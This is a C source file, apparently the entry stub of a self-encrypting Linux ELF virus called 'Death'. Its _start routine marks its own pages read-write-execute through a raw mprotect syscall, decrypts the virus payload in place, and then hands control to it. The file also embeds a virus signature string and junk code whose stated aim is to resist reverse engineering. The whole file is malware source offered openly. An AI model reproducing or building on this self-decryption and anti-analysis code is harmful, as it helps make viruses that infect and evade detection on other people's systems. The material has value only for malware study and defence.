#include <sys/mman.h>

#include "main.h"
#include "crypt.h"
#include "death.h"
#include "syscall.h"


void	decrypt_self(void);
void	entrypoint(int argc, char **argv, char **envp);

__attribute__((noreturn, section(".text.start#")))
void _start(void) {
	__asm__ __volatile__ (
		"push %rdx\n"
		);
	long rbp = (long)__builtin_frame_address(0); JUNK;
	long argc = *(long *)(rbp + 8); JUNK;
	char **argv = (char **)(rbp + 16); JUNK;
	char **envp = argv + argc + 1; JUNK;

	decrypt_self();
	entrypoint((int)argc, argv, envp);

	__asm__ __volatile__ (
		"pop %rdx\n"
		"leave\n"
		);
	__builtin_unreachable();
}

__attribute__((noreturn, section(".text.start#")))
void __attribute__((naked)) jmp_end(void) {
	__asm__ __volatile__ (
		"jmp real_end\n"
	);
}

#define TEXT_VAR __attribute__((section(".text#.vars")))

char	TEXT_VAR g_signature[SIGNATURE_SIZE] = \
"Death (c)oded by [diroyer] - deadbeaf:0000\n\0";

//uint8_t	TEXT_VAR g_key[KEY_SIZE] = {0};
bool	TEXT_VAR g_is_encrypted = false;

int		TEXT_VAR g_start_offset = ORIG_TEXT_OFF;
char	TEXT_VAR **g_envp = NULL;
unsigned int TEXT_VAR g_payload_size = 0;

void junk_main(void) {
	char hello[] = "dont reverse me :(";
	uint8_t yolo = hello[0] ^ hello[1];
	uint8_t *ptr = &yolo;
	*ptr ^= hello[2];
	*ptr ^= hello[3];
	*ptr ^= hello[4];
	*ptr ^= hello[5];
	*ptr ^= hello[6];
	*ptr += hello[8];
	*ptr -= hello[9];
	*ptr ^= hello[10];
	*ptr *= hello[11];
	*ptr %= hello[12];
	*ptr &= hello[13];
	*ptr |= hello[14];
	*ptr <<= hello[15];
	*ptr >>= hello[16];
	*ptr ^= hello[17];
	*ptr ^= hello[18];
}

void decrypt_self(void)
{
	if (g_is_encrypted == false) {
		return;
	}

	if (g_start_offset == ORIG_TEXT_OFF) {

		uintptr_t start = (uintptr_t)&_start;
		uintptr_t end = start + VIRUS_SIZE;

		uintptr_t page_start = start & ~(PAGE_SIZE - 1);
		uintptr_t page_end = (end + PAGE_SIZE - 1) & ~(PAGE_SIZE - 1);

		__asm__ __volatile__ (
				"movq %0, %%rax\n"
				"movq %1, %%rdi\n"
				"movq %2, %%rsi\n"
				"movq %3, %%rdx\n"
				"syscall\n"
				: /* no output */
				: "r"((long)SYS_mprotect), "r"(page_start), "r"(page_end - page_start), "r"((long)(PROT_READ | PROT_WRITE | PROT_EXEC))
				: "rax", "rdi", "rsi", "memory" /* clobber */
			);

	}

	//void *start_addr = (void* )(uintptr_t)&real_start;
	//decrypt(start_addr, PAYLOAD_SIZE, g_key);
	crypt((uint8_t *)(uintptr_t)&real_start, g_payload_size);
	return;
}
